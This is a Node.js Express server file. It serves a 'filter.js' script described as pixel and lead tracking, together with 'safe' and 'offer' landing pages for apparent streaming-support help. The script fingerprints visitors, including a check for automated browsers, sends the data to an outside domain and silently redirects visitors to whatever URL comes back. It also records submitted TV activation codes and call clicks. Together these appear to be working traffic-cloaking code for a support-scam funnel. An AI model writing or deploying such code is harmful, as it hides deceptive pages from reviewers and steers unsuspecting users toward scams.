const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 5000;

// /filter.js — FILTER pixel + lead tracking script (API key injected server-side)
app.get('/filter.js', function(req, res) {
  var key = process.env.FILTER_API_KEY || '';
  var script = [
    '(function(){',
    '  var _h=\'https://activatemytvcode.com\',',
    '      _k=\'' + key + '\';',
    '  try{',
    '    fetch(_h+\'/api/v1/pixel\',{',
    '      method:\'POST\',',
    '      headers:{\'Content-Type\':\'application/json\',\'X-Client-ID\':_k},',
    '      body:JSON.stringify({',
    '        ua:navigator.userAgent,',
    '        sw:screen.width,',
    '        sh:screen.height,',
    '        wd:!!navigator.webdriver,',
    '        pl:(navigator.plugins||[]).length,',
    '        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,',
    '        pg:window.location.pathname',
    '      })',
    '    })',
    '    .then(function(r){return r.json()})',
    '    .then(function(d){if(d&&d.url)window.location.replace(d.url)})',
    '    .catch(function(){});',
    '  }catch(e){}',
    '',
    '  window.trackLead=function(code,utmSource,utmCampaign,gclid){',
    '    try{',
    '      fetch(_h+\'/api/track/lead\',{',
    '        method:\'POST\',',
    '        headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},',
    '        body:JSON.stringify({',
    '          type:\'code_submit\',',
    '          code:code||\'\',',
    '          utm_source:utmSource||new URLSearchParams(location.search).get(\'utm_source\')||\'\',',
    '          utm_campaign:utmCampaign||new URLSearchParams(location.search).get(\'utm_campaign\')||\'\',',
    '          utm_medium:new URLSearchParams(location.search).get(\'utm_medium\')||\'\',',
    '          gclid:gclid||new URLSearchParams(location.search).get(\'gclid\')||\'\',',
    '          tz:Intl.DateTimeFormat().resolvedOptions().timeZone,',
    '          screen:screen.width+\'x\'+screen.height',
    '        })',
    '      }).catch(function(){});',
    '    }catch(e){}',
    '  };',
    '',
    '  window.trackCall=function(){',
    '    try{',
    '      fetch(_h+\'/api/track/lead\',{',
    '        method:\'POST\',',
    '        headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},',
    '        body:JSON.stringify({type:\'call_click\'})',
    '      }).catch(function(){});',
    '    }catch(e){}',
    '  };',
    '})();'
  ].join('\n');
  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  res.send(script);
});

// Serve static files from public folder
app.use(express.static(path.join(__dirname, 'public')));

// Homepage
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// /safe — Streaming Support & Help landing page
app.get('/safe', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

// /offer — Fix Your Streaming Issue Now landing page
app.get('/offer', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'offer.html'));
});

// Clean URLs - /paramount-plus serves paramount-plus.html
app.get('/:page', function(req, res) {
  var page = req.params.page;
  var filePath = path.join(__dirname, 'public', page + '.html');
  res.sendFile(filePath, function(err) {
    if (err) {
      res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
    }
  });
});

app.listen(PORT, '0.0.0.0', function() {
  console.log('Server running on port ' + PORT);
});
